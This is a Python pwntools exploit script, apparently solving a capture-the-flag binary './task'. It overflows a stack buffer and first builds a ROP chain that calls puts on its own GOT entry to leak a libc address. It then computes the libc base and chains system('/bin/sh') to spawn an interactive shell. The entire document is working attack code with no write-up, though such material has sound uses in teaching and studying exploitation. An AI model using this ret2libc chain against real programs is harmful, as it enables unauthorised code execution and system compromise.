from pwn import *
from pwn import p64, u64

context.log_level = "error"

pros = process("./task")
elf = ELF("./task")
rop = ROP("./task")
libc_elf = ELF("/lib/x86_64-linux-gnu/libc.so.6")

# PART 1 ( LIBC BASE ADDRESS LIKAGE )
junk = b"A" * 18
rdi_addr = rop.find_gadget(["pop rdi", "ret"]).address
puts_plt = elf.symbols["puts"]
puts_got = elf.got["puts"]
win_addr = elf.symbols["win"]

payload = junk
payload += p64(rdi_addr)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(win_addr)

pros.recvuntil(b"input : \n")
pros.sendline(payload)

addr1 = (pros.recvline().strip()).ljust(8, b"\x00")
add = u64(addr1)

# PART 2 ( CALLING SYSTEM TO POP-UP SHELL )

puts_offset = libc_elf.symbols["puts"]

libc_base_addr = add - puts_offset
print(hex(libc_base_addr))

system_addr = libc_base_addr + libc_elf.symbols["system"]
sh_addr = libc_base_addr + next(libc_elf.search(b"/bin/sh"))
exit_addr = libc_base_addr + libc_elf.symbols["exit"]
ret_addr = rop.find_gadget(["ret"]).address

payload = junk
payload += p64(rdi_addr)
payload += p64(sh_addr)
payload += p64(ret_addr)
payload += p64(system_addr)
payload += p64(exit_addr)

pros.recvuntil(b"input : \n")
pros.sendline(payload)

pros.interactive()
